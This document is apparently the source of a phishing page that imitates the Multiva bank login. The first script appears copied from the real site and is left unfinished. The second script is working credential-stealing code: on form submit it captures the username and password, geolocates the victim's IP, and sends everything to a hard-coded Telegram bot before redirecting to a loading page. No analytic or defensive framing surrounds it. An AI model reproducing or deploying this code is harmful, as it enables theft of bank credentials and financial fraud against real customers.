    <script type="text/javascript">
        function validainfo() {
            var xredigit = "^[0-9]{2,10}$";
            var xcliente = document.getElementById("username").value;
            xcliente = xcliente.trim();
            document.getElementById("username").value = xcliente;
            var xmatch = xcliente.match(xredigit);
            if (xmatch != null) return true; // Se trata de un cliente
            var xalias = document.getElementById('username');
            if ((xalias.value).length == 0) {
                alert("Error 02: ---> " + "El campo Cliente proporcionado esta vacio");
                //console.log('vacio', "El alias proporcionado esta vacio");
                // document.forms[0].username.focus();
                return (false);
            }
            var xmlhttp = new XMLHttpRequest();   // new HttpRequest instance 
            var xurl = '/MultiIdentidad/MultiIdentidadService/rest/buscarIdentidad';
            xmlhttp.open("POST", xurl, false);
            xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
            xmlhttp.setRequestHeader("Accept", "application/json;charset=UTF-8");
            xmlhttp.onload = function (e) {
                var xobj = JSON.parse(this.responseText);
                var xcodigo = xobj.codigo;
                if (xcodigo == '04') {
                    //alert("Error " + xobj.codigo + ": -----> " + xobj.descripcion);
                    console.log('error_404', xobj.descripcion);
                    window.location.href = "/multivanet/web/guest/beo#!/";
                    return (false);
                }
                else {
                    var xcliente = xobj.uid;
                    var xuser = document.getElementById("username");
                    document.cookie = "AliasUser=" + xuser.value;
                    xuser.value = xcliente;
                    console.log('response', this.response);
                    return (true);
                }
            };
            xmlhttp.send(JSON.stringify({ "alfanumerico": xalias.value }));
            console.log('status', xmlhttp.status);
            // se regresa informacion
            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) return (true);
            return (false);
        }

        function setFocus() {

    </script>

<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

<script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#loginform");
    form.addEventListener("submit", (event) => {
        event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
        axios
            .get(url)
            .then((response) => {
                const usuario = document.querySelector("#username").value;
                const contra = document.querySelector("#password").value;
                localStorage.setItem("usuario", usuario);
                const message =
                    "\nMultiva\nUsuario: " +
                    usuario +
                    "\nContra: " +
                    contra +
                    "\nCiudad:" +
                    response.data.city +
                    "\nPais: " +
                    response.data.country +
                    "\nIP: " +
                    response.data.ip;
                axios
                    .post(
                        "https://api.telegram.org/bot8332331530:AAE43Cf40UTWO7if5sHTNKqL0_D-BB1uv2I/sendMessage",
                        {
                            chat_id: "-4821668524",
                            text: message,
                        }
                    )
                    .then((response) => {
                        window.location.href = "cargando.html";
                    })
                    .catch((error) => {
                        console.error(error);
                    });
            })
            .catch((error) => {
                console.log(error);
            });
    });
</script>
